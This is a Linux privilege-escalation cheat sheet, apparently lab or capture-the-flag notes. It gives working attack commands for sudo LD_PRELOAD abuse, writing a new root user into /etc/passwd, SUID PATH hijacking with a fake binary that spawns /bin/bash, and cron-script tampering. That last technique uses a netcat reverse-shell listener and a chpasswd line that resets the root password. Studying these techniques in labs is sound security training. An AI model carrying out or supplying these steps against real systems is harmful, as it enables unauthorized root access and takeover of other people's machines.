## Sudo
`sudo -l` - what can be run by user at root privilege.  
### Leveraging LD_PRELOAD
if `env_keep` is enabled, then you can create a shared library that will be loaded and executed before the program is run.  
1. Check of `env_keep` - `sudo -l`.
2. Write a simple C code complied as a shared object.  
`gcc -fPIC -shared -o [FILENAME].so [FILENAME].c -nostartfiles`
3. Run the program as with sudo and the LD_PRELOAD option.  
`sudo LD_PRELOAD=/home/user/ldpreload/[FILENAME].so [program with sudo]`

## SUID
`find / -type f -perm -04000 -ls 2>/dev/null` - lists files with SUID or SGID bits.  

### Replacing the root user exploit
1. Create password hash.
`openssl passwd -1 -salt [SALT] [PASSWORD]`
2. Add password hash and username to `/etc/passwd`.
3. su [USERNAME].

### PATH
**Idea:** A root-owned SUID binary calls a command by name (not full path). You control PATH, so you make it run your binary instead — with root privileges.

#### Steps

1. **Find SUID binaries**
   ```
   find / -perm -4000 -type f 2>/dev/null
   ```
   This lists real paths on your box, e.g. `/usr/local/bin/checker` — call this `<suid_binary>` below. It is **not** literally named `program`; that was just an example.

2. **Check what command it calls**
   Look at the source if you have it, or run:
   ```
   strings <suid_binary>
   ```
   Look for an unqualified command name — a word with no `/` in it, e.g. `thm` instead of `/usr/bin/thm`. Call this `<command_name>` below. This is the exact name your fake binary must match.

3. **Find a writable directory**
   ```
   find / -type d -writable 2>/dev/null | sort -u
   ```
   Usually `/tmp`.

4. **Add it to the front of PATH**
   ```
   export PATH=/tmp:$PATH
   ```

5. **Create a fake binary with the same name**
   ```
   echo "/bin/bash" > /tmp/<command_name>
   chmod 777 /tmp/<command_name>
   ```

6. **Run the SUID binary**
   ```
   <suid_binary>
   ```
   (Use its full path, or `./<name>` if you're already in its directory.)

7. **Check you're root**
   ```
   whoami
   id
   ```

**Notes**  
- Only works if the binary uses `system()`/`popen()` with a bare command name.
- Won't work if the binary hardcodes its own PATH internally.

## Capabilities 
`getcap -r / 2>/dev/null` - lists enabled capabilities.  
- look for cap_setuid+ep that allows a binary to change its user ID to any user when executed.
GTFOBins or AI can help in writing exploits for binary.

## Cron
cron jobs can be found in:  
- /etc/crontab
- /etc/cron.d/
- /etc/cron.hourly (or daily, weekly, monthly)
- /var/spool/cron/crontabs/

After finding the cron script. We can modify it to launch a reverse shell with root privileges.  
`nc -nlvp [port number]` - on attack machine to receive shell.  

### Another method for Cron
Adding `echo "root:newpass" | chpasswd` into the vulnerable script.  
login as the root by calling `su root` and using new password.  
